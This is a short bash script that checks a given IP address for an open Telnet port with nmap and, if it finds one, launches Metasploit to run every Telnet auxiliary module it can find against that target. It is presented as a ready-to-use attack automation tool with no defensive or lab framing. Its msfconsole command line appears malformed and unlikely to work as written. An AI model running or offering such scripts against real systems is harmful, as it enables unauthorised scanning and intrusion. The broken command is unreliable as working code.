#!/bin/bash

# Check if an IP address is provided as argument
if [ $# -ne 1 ]; then
    echo "Usage: $0 <target_ip>"
    exit 1
fi

# Store the target IP address
target="$1"

# Perform Nmap scan to check for open ports
nmap_output=$(nmap -p23 "$target" -oG -)

# Check if port 23 (Telnet) is open
if grep -q "23/open" <<< "$nmap_output"; then
    # If port 23 is open, run all Telnet modules
    msfconsole -q -x "search telnet; use $(msfconsole -q -x 'search telnet' | grep 'auxiliary' | awk '{print $3}' | tr '\n' ';') ; setg RHOSTS \"$target\"; run; back; exit;"
else
    echo "Port 23 is not open. Skipping Telnet exploits."
fi

